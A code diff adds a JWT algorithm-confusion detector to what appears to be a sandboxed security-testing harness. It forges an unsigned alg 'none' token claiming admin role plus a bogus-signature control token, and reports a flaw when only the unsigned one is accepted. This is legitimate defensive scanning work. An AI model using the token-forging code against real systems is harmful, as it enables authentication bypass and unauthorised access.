@@ -10,6 +10,7 @@ unit-tested with no Docker or real tool present. A new capability is a new revie
 adapter here, never a general exec primitive (§5.3); the baseline HTTP probe lives in
 `harness/sandbox/probe.py`.
 """
+import base64
 import json
 import secrets
 import time
@@ -408,6 +409,67 @@ class BflaAdapter(_Adapter):
                 "authenticated": authenticated,
                 "anon_status": s_anon,
                 "user_status": s_user,
+                "confidence": 0.95 if hit else 0.0,
+            },
+        }
+
+
+def _b64u(raw):
+    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
+
+
+def _forge_jwt(claims, *, alg):
+    """Forge a JWT the harness never had the key to sign. With alg "none" the signature
+    is empty (the algorithm-confusion attack); with "HS256" it carries a bogus signature
+    that no correct verifier accepts (the control that proves the server honors "none"
+    specifically, rather than ignoring the signature on everything)."""
+    head = _b64u(json.dumps({"alg": alg, "typ": "JWT"}).encode())
+    payload = _b64u(json.dumps(claims).encode())
+    sig = "" if alg == "none" else _b64u(b"not-a-valid-signature")
+    return f"{head}.{payload}.{sig}"
+
+
+class JwtAdapter(_Adapter):
+    """JWT algorithm-confusion detection against a pinned in-scope target. Registered as
+    `jwt`.
+
+    The harness forges two tokens it could not legitimately sign and presents each to a
+    protected endpoint: one with alg "none" (no signature) carrying claims it chose, and
+    one with a bogus HS256 signature. It reports the flaw only when the unsigned token is
+    accepted (200) while the bogus-signature token is refused (401 or 403), which proves
+    the server honors alg "none" rather than skipping verification on every token. Both
+    tokens are forged in the adapter, so the signal is deterministic and harness-owned,
+    and the Verifier forges its own pair to reproduce it."""
+
+    def run(self, req):
+        ip = self._resolve(req["target"])
+        port = int(req["port"])
+        args = req.get("args") or {}
+        scheme = args.get("scheme") or ("https" if port in (443, 8443) else "http")
+        path = args.get("path", "/account")
+        params = dict(args.get("params") or {})
+        claims = args.get("claims") or {"sub": "1", "role": "admin"}
+
+        def present(token):
+            qs = urllib.parse.urlencode(params)
+            url = f"{scheme}://{ip}:{port}{path}" + (f"?{qs}" if qs else "")
+            return url, self._send_http(url, "GET", {"Authorization": f"Bearer {token}"})
+
+        forged_none = _forge_jwt(claims, alg="none")
+        forged_bad = _forge_jwt(claims, alg="HS256")
+        url, (s_none, _) = present(forged_none)
+        _, (s_bad, _) = present(forged_bad)
+        hit = s_none == 200 and s_bad in (401, 403)
+        return {
+            "status": "ok" if hit else "error",
+            "parsed": {"alg_none_status": s_none, "bad_sig_status": s_bad},
+            "request_bytes": f"jwt {url} alg=none forged".encode("utf-8"),
+            "response_bytes": f"alg_none[{s_none}] bad_sig[{s_bad}]".encode("utf-8"),
+            "deterministic_signals": {
+                "hit": hit,
+                "jwt_alg_confusion": hit,
+                "alg_none_status": s_none,
+                "bad_sig_status": s_bad,
                 "confidence": 0.95 if hit else 0.0,
             },
         }
